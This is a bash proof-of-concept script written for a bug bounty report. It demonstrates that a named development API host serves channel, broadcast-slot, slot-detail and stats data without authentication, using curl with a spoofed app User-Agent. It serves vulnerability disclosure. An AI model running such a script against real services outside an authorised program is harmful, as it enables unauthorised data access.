#!/bin/bash
# PoC for Finding 2: Publicly Accessible Development API (dev-api.d-c3-e.abema-tv.com)
# Related to in-scope *.abema-tv.com per ABEMA Bug Bounty Program on IssueHunt
set -uo pipefail
UA="AbemaTV;10.184.0;"

echo "=== [1] Dev channel list (expect HTTP 200, no auth) ==="
curl -s -m 30 -H "User-Agent: $UA" "https://dev-api.d-c3-e.abema-tv.com/v1/channels" \
  -o /tmp/poc2_ch.json -w "HTTP %{http_code}\n"
python3 -c "
import json
d=json.load(open('/tmp/poc2_ch.json'))
ch=d['channels']
print('  -> channels returned:', len(ch))
print('  -> sample:', ch[0]['id'], '|', ch[0]['name'])
print('  -> internal CDN host in playback:', ch[0]['playback']['hls'])
"

echo ""
echo "=== [2] Dev broadcast slots (expect HTTP 200, no auth) ==="
curl -s -m 30 -H "User-Agent: $UA" "https://dev-api.d-c3-e.abema-tv.com/v1/broadcast/slots?channelId=abema-anime" \
  -o /tmp/poc2_slots.json -w "HTTP %{http_code}\n"
python3 -c "
import json
d=json.load(open('/tmp/poc2_slots.json'))
print('  -> slots returned:', len(d['slots']))
print('  -> sample:', d['slots'][0]['id'], '|', d['slots'][0]['title'][:45])
"

echo ""
echo "=== [3] Dev single slot detail (expect HTTP 200, no auth) ==="
# Slot ids rotate, so derive a live id from the list fetched in step [2].
SLOT=$(python3 -c "import json; print(json.load(open('/tmp/poc2_slots.json'))['slots'][0]['id'])")
echo "  (using live slot id: $SLOT)"
curl -s -m 30 -H "User-Agent: $UA" "https://dev-api.d-c3-e.abema-tv.com/v1/broadcast/slots/$SLOT" \
  -o /tmp/poc2_detail.json -w "HTTP %{http_code}\n"
python3 -c "
import json,sys
d=json.load(open('/tmp/poc2_detail.json'))
if 'slot' not in d:
    print('  -> ERROR: unexpected response:', str(d)[:150]); sys.exit(1)
d=d['slot']
print('  -> id:', d['id'], '| title:', d['title'][:45], '| channel:', d['channelId'])
print('  -> content:', d.get('content','')[:120])
"

echo ""
echo "=== [4] Dev slot stats (expect HTTP 200, no auth) ==="
curl -s -m 30 -H "User-Agent: $UA" "https://dev-api.d-c3-e.abema-tv.com/v1/broadcast/slots/$SLOT/stats" \
  -o /tmp/poc2_stats.json -w "HTTP %{http_code}\n"
cat /tmp/poc2_stats.json
echo ""

echo ""
echo "=== [5] Contrast: same host family, auth required ==="
curl -s -m 25 -H "User-Agent: $UA" "https://dev-api.d-c3-e.abema-tv.com/v1/version" \
  -o /tmp/poc2_v.json -w "HTTP %{http_code}\n"
cat /tmp/poc2_v.json
echo ""

echo ""
echo "RESULT: dev-api serves channels/slots/detail/stats with no credential; /v1/version on same host returns 401."